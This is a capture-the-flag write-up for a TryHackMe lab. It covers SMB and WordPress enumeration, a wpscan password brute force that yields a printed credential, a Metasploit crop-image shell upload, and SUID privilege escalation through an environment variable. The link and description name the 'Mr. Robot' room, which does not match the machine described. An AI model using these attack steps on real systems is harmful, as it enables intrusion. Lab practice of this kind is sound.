---
layout: post
title: BILLY JOEL - coming soon
date:   2025-10-30 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
[Link To CTF](https://tryhackme.com/room/mrrobot)
-TRYHACKME CTF WRITEUP-
<br>
<br>
<br>
## nmap shows: 
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

## Let's do an SMB scan

## smbmap shows:
        print$                                                  NO ACCESS       Printer Drivers
        BillySMB                                                READ, WRITE     Billy's local SMB Share
        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
   

<br>
{% highlight bash %}
***SMB rabbit Hole***
Navingating into the SMB share,
I found 2 images and 1 mp4 audio file
I download all 3

This turned out to be a rabbit hole
Alice-white-rabbit literally says "rabbit hole"
tswift is literally a taylor swift music video
check-this opens a urlcode to a billy joel music vido 
***Looks like SMB was a dead end
{% endhighlight bash %}
<br>

## As this machine details that a wordpress blog is being used lets check it out:
{% highlight bash %}
wpscan --update
wpscan -H 
wpscan -e vp,vt,u
{% endhighlight bash %}

## Full scan shows usernames 
bjoel
kwheel

## we can brute force passwords for these usernames 
wpscan --url http://10.201.58.182 --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 


## We get karen Wheelers username and password
Username: kwheel, Password: cutiepie1

## Looking at robots.txt: 
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

{% highlight bash %}
*** /wp-admin/admin-ajax.php is a dead end
*** /wp-content shows another dead end
{% endhighlight bash %}

## login page at:
/wp-admin/


## We can login at /wp-admin

## Attempting to upload payloads shows filters preventing the php script


This is WordPress 5.0, which is vulnerable! 
If we take a look at exploit-db, We find out that there is a vulnerability "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",



Searching WordPress 5.0 on Metasploit we can run exploit  #0
0   exploit/multi/http/wp_crop_rce   
enter USERNAME PASSWORD RHOST AND LHOST AND LPORT



We get shell as www-data


Looking for the user flag we see its not where we think it is:


Looking for clues we see a termination letter


The company is rubber ducky and billy joel was let go for illegal use of removable media
lets check /media/usb -- denied


let try find / -type f -perm -04000 -ls 2>/dev/null 

We see something interesting

/usr/sbin/checker


it is a root owned binary, with SUID flag on


 it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?


$ export admin=1
$ ltrace checker


so now it tries to run bash! And since this is owned by root, it'll run bash as root! 
/usr/sbin/checker


 We now get root and see the user flag where we tried to look before
We also now get root flag
!!!!!!!!!!!














